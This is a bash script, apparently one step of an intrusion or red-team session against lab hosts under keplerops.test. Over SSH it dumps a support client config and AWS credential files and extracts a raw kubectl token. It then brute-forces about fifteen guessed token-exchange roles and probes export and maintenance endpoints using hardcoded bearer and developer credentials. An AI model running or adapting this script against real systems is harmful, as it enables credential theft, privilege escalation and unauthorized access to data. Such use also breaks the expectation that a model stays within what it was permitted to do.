set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
$S 'bash -s' <<'RSH'
set +e
CA=$HOME/.local/share/keplerops/ca.crt
echo "###### support-client.json"
cat ~/.config/fieldlink/support-client.json
echo "###### aws config"
cat ~/.aws/config ~/.aws/credentials 2>/dev/null
echo "###### data well-known raw"
curl -sS -m 12 --cacert $CA -i https://data.keplerops.test/.well-known/fieldkest-client | head -c 1500; echo
echo "###### cloud-api token-exchange matrix"
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
C=https://cloud-api.keplerops.test
for r in export export-role export-reader export-writer export-runner export-operator support-export data-export data-reader workspace workspace-reader rowan-workspace fieldlink-export export-service export-job; do
  for m in GET POST; do
    if [ $m = POST ]; then
      out=$(curl -sS -m 8 --cacert $CA -X POST -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' -d '{}' -w ' [%{http_code}]' "$C/api/token-exchange/$r")
    else
      out=$(curl -sS -m 8 --cacert $CA -H "Authorization: Bearer $JWT" -w ' [%{http_code}]' "$C/api/token-exchange/$r")
    fi
    echo "-- $m $r => $(echo "$out" | head -c 300)"
  done
done
echo "###### cloud-api with support bearer"
SB="fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"
for p in api/exports/EXP-2841 api/exports/EXP-2841/definition api/schedules/SCHED-2841 api/workspaces/current/token-exchange api/maintenance; do
  echo "-- $p"
  curl -sS -m 10 --cacert $CA -H "Authorization: Bearer $SB" -w '\n[%{http_code}]\n' "$C/$p" | head -c 600; echo
done
echo "###### gitea issues"
A="Authorization: Basic $(printf "rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo" | base64 -w0)"
G=https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector
curl -sS -m 12 --cacert $CA -H "$A" "$G/issues?state=all&limit=50" -o /tmp/issues.json -w 'issues [%{http_code}]\n'
python3 - <<'PY'
import json
try:
 d=json.load(open('/tmp/issues.json'))
 for i in d:
  print(i.get('number'), '|', i.get('title'), '|', i.get('state'))
except Exception as e:
 print('ERR',e, open('/tmp/issues.json').read()[:500])
PY
RSH
echo DONE_S6
